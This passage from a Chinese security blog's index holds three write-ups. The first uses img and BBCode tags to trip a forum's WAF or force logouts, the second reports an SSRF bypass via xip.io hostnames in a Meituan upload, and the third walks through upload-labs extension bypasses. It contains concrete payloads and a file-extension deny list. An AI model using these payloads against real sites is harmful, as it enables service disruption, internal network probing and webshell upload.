punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>拦截吧（你打不开i春秋了）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://bbs.ichunqiu.com/portal.php?a<span class="token punctuation">=</span>alert(1)<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>然后在浏览器处打开</p><p><img src="http://static.zybuluo.com/1kbfree/o1esq9tp010wd1h1lcfg5djd/image_1co8pnjs3hpu61e2qu178avuq13.png" alt="image_1co8pnjs3hpu61e2qu178avuq13.png-13.8kB"></p><p>然后再尝试打开<code>I春秋</code></p><p><img src="http://static.zybuluo.com/1kbfree/jm5cdg98scgmuh8bruh46a1k/image_1co8ppa5ldmeg3r1b2ria5128h1g.png" alt="image_1co8ppa5ldmeg3r1b2ria5128h1g.png-74.1kB"></p><p>我来解释一下为啥子~因为<code>img</code>标签设置的<code>src</code>属性是<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>，所以打开页面会加载<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>这个<code>URL</code>，然后我们访问这个<code>URL</code>的话会被<code>WAF</code>拦截，导致无法访问<code>I春秋</code></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>我们可以看到<code>I春秋</code>回复处可以加载图片，如下（随便打开一个文章：<code>https://bbs.ichunqiu.com/thread-46084-1-1.html</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/eje7n4yxnwov6cp5zmiuqoif/image_1co8rbua7oeq4qj6kmte5vvm6r.png" alt="image_1co8rbua7oeq4qj6kmte5vvm6r.png-111.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/nk77x8b6bu3olh7vd7o2ecx1/image_1co8rd4ln1s3uj5ubud1st01gij78.png" alt="image_1co8rd4ln1s3uj5ubud1st01gij78.png-149.4kB"></p><p>上传的图片是：<code>https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle</code></p><p>那么我想让别人访问这个文章就显示<code>WAF</code>拦截页面如何搞？ 嘿嘿，可以在链接后面加个<code>&amp;a=alert(1)</code>，变成<code>https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1)</code></p><blockquote><p>注意：先发一条评论然后点击编辑然后插入这段代码</p></blockquote><pre><code>[img=120,120]https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1)[/img]</code></pre><p>如下</p><p><img src="http://static.zybuluo.com/1kbfree/6sq9x8f4w6ntntvxjxqztqvz/image_1co8rja781h0o9q282f11lva7l82.png" alt="image_1co8rja781h0o9q282f11lva7l82.png-103.1kB"></p><p>然后再次访问 <code>https://bbs.ichunqiu.com/thread-46084-1-1.html</code></p><p><img src="http://static.zybuluo.com/1kbfree/v8ky2tc30m99log7jrih4khx/image_1co8rlknh1bi6i131rafr51nbf8f.png" alt="image_1co8rlknh1bi6i131rafr51nbf8f.png-100.1kB"></p><p>可以看到加载了，那么刷新一下~</p><p><img src="http://static.zybuluo.com/1kbfree/uz3q9onxmdllqfac4gpwwmam/image_1co8rm7751lfi16hb10e31151rae8s.png" alt="image_1co8rm7751lfi16hb10e31151rae8s.png-81.3kB"></p><p>那么，我如果想恶意破坏的话，我可以在每个文章那里加上这个代码（评论），导致每个看文章的人无法正常访问I春秋~~</p><h3 id="漏洞案例复现"><a href="#漏洞案例复现" class="headerlink" title="漏洞案例复现"></a>漏洞案例复现</h3><p>利用条件：</p><p>1、退出的Url没有Token等验证<br>2、可以有<code>&lt;img&gt;</code>或者其他加载资源的标签</p><p>首先，知道某网站的退出链接是<code>http://www.xxx.com/exit</code>。</p><p>那么我们可以去找到论坛留言处、头像处、背景图片处将Url设置为<code>http://www.xxx.com/exit</code>，那么当用户每次访问的时候都会退出。如下是一个漏洞案例</p><p>1、打开Url：<a href="http://xxxxxx/forum.php?id=马赛克" target="_blank" rel="noopener">http://xxxxxx/forum.php?id=马赛克</a> （随便找的一个帖子），然后评论一下，并且抓包加入恶意代码，如下</p><p><img src="http://static.zybuluo.com/1kbfree/mzs2zy1p11g46343mj011xre/image_1cqbpd8e23mnkej99cnep1cro9.png" alt=""></p><p>加入的代码是 <code>[img]http://xxxxxx/logout?client_id=1[/img]</code></p><p>2、然后打开帖子</p><p><img src="http://static.zybuluo.com/1kbfree/ls8y940ot3y8lanz0b9v7u7m/image_1cqbpfvh81qrm1lne1tbo1iou16qm.png" alt=""></p><p><img src="http://static.zybuluo.com/1kbfree/vogapad0mu7bdhkmk0zpywab/image_1cqbpif0ptjk1p5d1tqp8slj0j13.png" alt=""></p><p>可以看到已经退出了~</p><p>利用思路</p><p>上面是一个利用思路，但是这个只是评论处的利用，其实还有很多可以，如下几列</p><p>1、可以利用Csrf漏洞结合，把头像、个人背景等img的地址修改为退出url<br>2、利用越权改头像把图片地址改成退出地址，然后其他用户一登录就退出，增加危害~<br>3、有些网站聊天处可以发图片，那么可以发送一个退出Url给他，导致退出（单次的，低危害） </p><h3 id="思路扩展"><a href="#思路扩展" class="headerlink" title="思路扩展"></a>思路扩展</h3><p>1、有个<code>get</code>请求的<code>csrf</code>，但是严格的验证了<code>referer</code>为<code>www.a.com</code>，那么可以在<code>www.a.com</code>中插入一个外链，然后把外链地址改为<code>get</code>请求的<code>csrf</code>地址，就可以绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美团某处上传存在SSRF漏洞</title>
      <link href="/2018/12/24/mei-tuan-mou-chu-shang-chuan-cun-zai-ssrf-lou-dong/"/>
      <url>/2018/12/24/mei-tuan-mou-chu-shang-chuan-cun-zai-ssrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>1、打开Url：<a href="http://xxx.com/profile" target="_blank" rel="noopener">http://xxx.com/profile</a> ，然后选择一个图片上传然后抓包发现有如下请求</p><p><img src="http://static.zybuluo.com/1kbfree/27tbui8q7e9x7ravx8jivzdk/1.png" alt="1.png-220kB"></p><p>然后我猜想这里的处理流程是这样的：</p><ol><li>上传文件后返回包返回一个<code>Url</code></li><li>然后上图那个请求把一部的<code>Url</code>去访问并且使其成为图片地址（应该是读取<code>Url</code>然后把它内容写入~）</li></ol><p>那么以上流程如果<code>Url</code>没有严格过滤的话是会造成<code>SSRF</code>的，但是这里有过滤，但仍可以绕过~</p><pre><code>http://p1.meituan.net.127.0.0.1.xip.io</code></pre><p>上面这个<code>url</code>打开等于打开<code>127.0.0.1</code>（<code>ping</code>一下就知道了）</p><p><img src="http://static.zybuluo.com/1kbfree/n4bivtodu7857uam9n5yh55x/1.png" alt="1.png-24.5kB"></p><p>这里去请求一下我的<code>ceye</code>（和<code>dnslog</code>一样的）</p><p><img src="http://static.zybuluo.com/1kbfree/d3m6dlql5t7zg646b6chlcmv/1.png" alt="1.png-232.5kB"></p><p>然后去我的<code>CEYE</code>去看下~</p><p><img src="http://static.zybuluo.com/1kbfree/t1ejl7jg1dimuvvkr8fx0fwb/image.png" alt="image.png-110.8kB"></p><p>可以看到他这里是有去请求的，那么还可以利用<code>CEYE</code>的<code>DNS Rebinding</code>使其去访问一个<code>ip</code>（比较麻烦），所以这里用另一种方法来使其访问随意一个<code>ip</code></p><pre><code>http://p1.meituan.net.183.232.231.172.xip.io/</code></pre><p>这里的<code>183.232.231.172</code>是我<code>ping</code>百度的<code>ip</code>，然后我打开一下看看~</p><p><img src="http://static.zybuluo.com/1kbfree/lz0psyxavxnf65hxnnclmgv6/1.png" alt="1.png-32.9kB"></p><p>然后放入请求中是可以正常访问的，如图</p><p><img src="http://static.zybuluo.com/1kbfree/yakvfdjz5uwlo28t22u6545v/1.png" alt="1.png-234.5kB"></p><p>那么再测试一个无法访问的<code>ip</code>试试</p><p><img src="http://static.zybuluo.com/1kbfree/q6qy5t0ntzztbjpmlh6sq0p5/1.png" alt="1.png-254.4kB"></p><p>可以看到返回的是<code>504</code>而且请求时间非常的长~ </p><p>下面探测内网的就不展示了。</p><h3 id="漏洞进展"><a href="#漏洞进展" class="headerlink" title="漏洞进展"></a>漏洞进展</h3><p>评级：中<br>奖金：250</p><blockquote><p>因为非核心业务所以给的钱比较少</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/2018/12/23/ce-shi/"/>
      <url>/2018/12/23/ce-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>这是一个文件上传的靶场（总共19关）</p><p>下载地址：<br><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><strong>第一关：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/dfxzko0fx07b0zzwhs8b9rc5/image.png" alt="image.png-194.5kB"></p><p>可以看到这里的上传的验证是<code>javascript</code>验证的，也就是前台认证，但是我们可以利用后台验证绕过。</p><p>步骤：<br>1、上传一个<code>2.png</code><br>2、抓包将<code>2.png</code>修改为<code>2.php</code></p><p><img src="http://static.zybuluo.com/1kbfree/7i5cct348yr73j5bb5lvq83o/1.png" alt="1.png-225.3kB"></p><p>然后看看是否成功上传</p><p><img src="http://static.zybuluo.com/1kbfree/yalbi6a2hqg1edk2av1g1irf/1.png" alt="1.png-16.1kB"></p><blockquote><p><code>upload</code>目录是这个靶机上传的文件的存放目录，所以上传的东西都会在这里，所以看有没有成功上传的话可以直接来这里看，或者去访问一下<code>http://xxx.xxx.xxx/upload/文件名</code>，如我刚刚上传的<code>2.php</code>就是这个链接</p></blockquote><p><a href="http://127.0.0.1/upload/upload/2.php" target="_blank" rel="noopener">http://127.0.0.1/upload/upload/2.php</a></p><p><img src="http://static.zybuluo.com/1kbfree/angm6k565a0a80yb92s88aag/1.png" alt="1.png-51.8kB"></p><p><strong>第二关：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/tqnbqfhzv9lwkw5czg14ww0r/1.png" alt="1.png-256kB"></p><p>所谓文件类型就是上传文件的时候请求中的<code>Content-Type</code>，如下</p><p><img src="http://static.zybuluo.com/1kbfree/l3to2zba83jvgqcwo4qd29m9/1.png" alt="1.png-206.5kB"></p><p>这关的代码逻辑就是，如果上传的文件类型是<code>image/jpeg</code>或<code>image/png</code>或<code>image/gif</code>就可以上传。那么只要上传一个<code>php</code>文件，然后把文件类型修改为<code>image/jpeg</code>即可上传</p><p><img src="http://static.zybuluo.com/1kbfree/xjeoam8717exn8g2d242f27c/1.png" alt="1.png-132.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/reje45f4tr5e91y6l1wnxwtk/1.png" alt="1.png-30.6kB"></p><p>成功上传~</p><p><strong>第三关：</strong></p><blockquote><p>此关就是后台禁止<code>php</code>、<code>jsp</code>、<code>asp</code>、<code>aspx</code>这四个文件上传</p></blockquote><p>这关的代码比较长，我就直接贴出来了~</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.asp'</span><span class="token punctuation">,</span><span class="token string">'.aspx'</span><span class="token punctuation">,</span><span class="token string">'.php'</span><span class="token punctuation">,</span><span class="token string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 获取文件名的后缀（就是获取.后面的内容）</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 如果$file_ext的值不在$deny_ext列表里，即进入条件</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>既然不能上传<code>php</code>，那么我们可以上传<code>.php3</code>（上传后也是当<code>php</code>解析）</p><p><img src="http://static.zybuluo.com/1kbfree/gklph1wdj0vfabm9i2z7w1ba/1.png" alt="1.png-135.2kB"></p><p>然后看看是否上传了</p><p><img src="http://static.zybuluo.com/1kbfree/f9jc8iu3bedg49usjc4tipvg/1.png" alt="1.png-25.3kB"></p><p>可以看到是上传了的，但是为什么名字会那么长呢？<br>可以看看代码中第<code>15</code>行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre><p>这个<code>$img_path</code>就是上传后的文件的地址，<code>UPDATE_PATH</code>就是上传目录(<code>upload</code>)，<code>data(&quot;YmdHis&quot;)</code>就是当前时间的年月日时分秒，<code>rand(1000,9999)</code>就是在<code>0000</code>到<code>9999</code>中随机抽数字，<code>$file_ext</code>就是上传的文件的后缀，所以拼接起来就是这么长的名字。</p><p>那么我们上传了这个文件后，看不到他的名字，我们就可以爆破当前时间的年月日时分秒，然后后面几个随机数字爆破，这里不演示了，直接打开看看<code>php3</code>是否和<code>php</code>效果一样~</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
